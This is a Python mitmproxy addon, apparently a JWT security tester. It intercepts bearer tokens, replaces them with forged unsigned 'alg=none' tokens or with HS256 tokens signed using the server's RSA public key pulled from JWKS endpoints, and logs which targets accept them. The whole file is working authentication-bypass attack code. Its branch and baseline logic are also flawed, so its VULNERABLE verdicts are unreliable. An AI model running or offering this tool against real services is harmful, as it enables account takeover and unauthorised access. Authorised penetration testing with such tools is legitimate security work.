from mitmproxy import http
import jwt
import base64
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from datetime import datetime
from urllib.parse import urlparse
import requests

RESULT_FILE = "jwt_generic_results_script7.txt"

JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/oauth/jwks",
    "/keys",
    "/auth/keys"
]

baseline = {}
tested = set()
public_key_pem = None

# ---------------- helpers ----------------

def b64url_decode(data):
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))

def jwk_to_pem(jwk):
    n = int.from_bytes(b64url_decode(jwk["n"]), "big")
    e = int.from_bytes(b64url_decode(jwk["e"]), "big")
    pub = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
    return pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()

def discover_jwks(origin):
    for path in JWKS_PATHS:
        try:
            r = requests.get(origin + path, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if "keys" in data and data["keys"]:
                    return data["keys"][0]
        except Exception:
            pass
    return None

def log_result(flow, attack, result, verdict, confidence):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    size = len(flow.response.content or b"")

    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: {attack}\n"
            f"METHOD: {flow.request.method}\n"
            f"URL: {flow.request.path}\n"
            f"STATUS: {flow.response.status_code}\n"
            f"RESPONSE_SIZE: {size} bytes\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"{'-'*60}\n\n"
        )

# ---------------- mitmproxy hooks ----------------

def request(flow: http.HTTPFlow):
    global public_key_pem

    auth = flow.request.headers.get("Authorization", "")
    if not auth.lower().startswith("bearer "):
        return

    token = auth[7:]

    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
    except Exception:
        return

    alg = header.get("alg", "")

    origin = f"{urlparse(flow.request.pretty_url).scheme}://{urlparse(flow.request.pretty_url).netloc}"

    # ---------------- 1) alg = none test ----------------
    if alg != "none":
        try:
            none_token = jwt.encode(payload, key=None, algorithm="none")
            flow.request.headers["Authorization"] = f"Bearer {none_token}"
            flow.request.headers["X-JWT-Test"] = "alg-none"
            return
        except Exception:
            pass

    # ---------------- 2) RS → HS confusion test ----------------
    if alg.startswith("RS"):
        if public_key_pem is None:
            jwk = discover_jwks(origin)
            if jwk:
                public_key_pem = jwk_to_pem(jwk)

        if public_key_pem:
            confused_token = jwt.encode(
                payload,
                public_key_pem,
                algorithm="HS256",
                headers={"alg": "HS256", "typ": "JWT"}
            )
            flow.request.headers["Authorization"] = f"Bearer {confused_token}"
            flow.request.headers["X-JWT-Test"] = "rs-hs-confusion"
            return

    # ---------------- 3) HS algorithm detection (safe case) ----------------
    if alg.startswith("HS"):
        flow.request.headers["X-JWT-Test"] = "hs-detected"
        return


def response(flow: http.HTTPFlow):
    key = (flow.request.method, flow.request.path)

    if key not in baseline:
        baseline[key] = flow.response.status_code
        return

    if key in tested:
        return
    tested.add(key)

    base_status = baseline[key]
    status = flow.response.status_code
    test_type = flow.request.headers.get("X-JWT-Test", "")

    # ----------- Verdict Logic -----------

    if test_type == "alg-none":
        if base_status == status and status == 200:
            log_result(flow, "alg=none", "Token accepted without signature", "VULNERABLE", "HIGH")
        else:
            log_result(flow, "alg=none", "Rejected unsigned token", "NOT VULNERABLE", "HIGH")

    elif test_type == "rs-hs-confusion":
        if base_status == status and status == 200:
            log_result(flow, "RS → HS confusion", "HS token accepted with RSA public key", "VULNERABLE", "HIGH")
        else:
            log_result(flow, "RS → HS confusion", "Algorithm confusion rejected", "NOT VULNERABLE", "HIGH")

    elif test_type == "hs-detected":
        log_result(flow, "HS algorithm usage", "HS variant detected", "NOT VULNERABLE (for RS→HS attack)", "MEDIUM")

    else:
        log_result(flow, "Generic JWT test", "Unexpected behavior", "POTENTIALLY VULNERABLE", "LOW")
